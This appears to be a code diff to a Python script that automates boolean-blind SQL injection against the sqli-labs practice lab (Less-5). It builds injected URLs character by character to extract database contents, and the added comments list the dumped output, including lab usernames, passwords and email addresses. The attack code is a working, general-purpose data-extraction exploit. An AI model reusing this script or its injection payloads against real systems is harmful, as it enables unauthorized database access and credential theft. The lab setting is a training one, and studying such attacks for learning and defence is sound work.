@@ -28,10 +28,11 @@ NUMBER_CHAR_LIST: Final[Tuple[str, ...]] = ('0','1','2','3','4','5','6','7','8',
 # '(' (40), ')' (41), '*' (42), ',' (44), '.' (46), '/' (47), ';' (59),
 # '<' (60), '=' (61), '>' (62), '@' (64), '[' (91), '\\' (92), ']' (93),
 # '_' (95), '`' (96), '{' (123), '|' (124), '}' (125), '©' (169),
-# '—' (8212), '€' (8364)
-# Note that "\\" will output: "\"
+# '—' (8212), '€' (8364), '!' (33), '-' (45),
+# 1.Note that "\\" will output: "\"
+# 2.Note that '—'(8212) is difference from '-'(45)
 OTHERS_CHAR_LIST: Final[Tuple[str, ...]] = (' ', ',', '"', '#', '$', '%', '&', "'", '(', ')', '*', ',', '.', 
-                               '/', ';', '<', '=', '>', '@', '[', "\\", ']', '_', '`', '{', '|', '}', '©', '€', '—')
+                               '/', ';', '<', '=', '>', '@', '[', "\\", ']', '_', '`', '{', '|', '}', '©', '€', '—', '!', '-',)
 
 # all_char_sorted_list: All char lists included, such as four lists as above
 all_char_list: List[str] = list((*LOWERCASE_CHAR_LIST, *UPPERCASE_CHAR_LIST, *NUMBER_CHAR_LIST, *OTHERS_CHAR_LIST))
@@ -252,22 +253,21 @@ def get_data(table_column_data_len_dict: Dict[str, Dict[str, List[int]]], patter
         column_data_dict: Dict[str, List[str]] = {}
         for column_name, data_len_list in column_and_data_len_dict.items():
             data_str_list: List[str] = []
+            limit_begin_index: int = 0
             for data_len in data_len_list:
                 data_str: str = ''
                 data_char_ascii_index: int = 0
-                if data_char_ascii_index > len(all_char_ascii_sorted_list):
-                    print(f'Error: not found the char in all_char_ascii_sorted_list')
-                else:
-                    # data_char_ascii: int = all_char_ascii_sorted_list[data_char_ascii_index]
-                    limit_begin_index: int = 0
-                    substr_begin_index: int = 1
-                    while len(data_str) < data_len:
+                substr_begin_index: int = 1
+                while len(data_str) < data_len:
+                    print(f'---> data length: {data_len}')
+                    if data_char_ascii_index > len(all_char_ascii_sorted_list) - 1:
+                        print(f'Error: not found the char in all_char_ascii_sorted_list')
+                    else:
                         data_char_ascii: int = all_char_ascii_sorted_list[data_char_ascii_index]
-                        # /Less-5/?id=1' and ascii(substr((select email_id from emails limit 0,1), 1,1))='68'--+
-                        url_str: str = f"/Less-5/?id=1' and ascii(substr((select {column_name} from {table_name} limit {limit_begin_index},1), {substr_begin_index},1))='{data_char_ascii}'--+"
+                        url_str: str = f"/Less-5/?id=1' and ascii(substr((select {column_name} from {table_name} limit {limit_begin_index},1), {substr_begin_index},1))='{data_char_ascii}'"
+                        print(f'---> {chr(data_char_ascii)}')
                         url_str = LAB_ROOT_URL + url_str + SQL_COMMENT
                         print(f'Try to get the data: {url_str}')
-                        time.sleep(2)
                         if get_method(url=url_str, pattern=pattern):
                             data_str = data_str + chr(data_char_ascii)
                             substr_begin_index = substr_begin_index + 1
@@ -339,5 +339,81 @@ for table_name, column_and_data_len_dict in table_column_data_len_dict.items():
         print(f'\tcolumn name: {column_name}, data length list: {data_len_list}')
 print('\n\n')
 
+# table name: emails
+#         column name: id
+#                 data: 1
+#                 data: 2
+#                 data: 3
+#                 data: 4
+#                 data: 5
+#                 data: 6
+#                 data: 7
+#                 data: 8
+#         column name: email_id
+#                 data: Dumb@dhakkan.com
+#                 data: Angel@iloveu.com
+#                 data: Dummy@dhakkan.local
+#                 data: secure@dhakkan.local
+#                 data: stupid@dhakkan.local
+#                 data: superman@dhakkan.local
+#                 data: batman@dhakkan.local
+#                 data: admin@dhakkan.com
+# table name: referers
+#         column name: id
+#         column name: referer
+#         column name: ip_address
+# table name: uagents
+#         column name: id
+#         column name: uagent
+#         column name: ip_address
+#         column name: username
+# table name: users
+#         column name: id
+#                 data: 1
+#                 data: 2
+#                 data: 3
+#                 data: 4
+#                 data: 5
+#                 data: 6
+#                 data: 7
+#                 data: 8
+#                 data: 9
+#                 data: 10
+#                 data: 11
+#                 data: 12
+#                 data: 14
+#         column name: username
+#                 data: Dumb
+#                 data: Angelina
+#                 data: Dummy
+#                 data: secure
+#                 data: stupid
+#                 data: superman
+#                 data: batman
+#                 data: admin
+#                 data: admin1
+#                 data: admin2
+#                 data: admin3
+#                 data: dhakkan
+#                 data: admin4
+#         column name: password
+#                 data: Dumb
+#                 data: I-kill-you
+#                 data: p@ssword
+#                 data: crappy
+#                 data: stupidity
+#                 data: genious
+#                 data: mob!le
+#                 data: admin
+#                 data: admin1
+#                 data: admin2
+#                 data: admin3
+#                 data: dumbo
+#                 data: admin4
 table_column_data_dict: Dict[str, Dict[str, List[str]]] = get_data(table_column_data_len_dict=table_column_data_len_dict, pattern='You are in')
-print(f'The table, column and data dict: {table_column_data_dict}')
+for table_name, column_and_data_dict in table_column_data_dict.items():
+    print(f'table name: {table_name}')
+    for column_name, data_list in column_and_data_dict.items():
+        print(f'\tcolumn name: {column_name}')
+        for data in data_list:
+            print(f'\t\tdata: {data}')
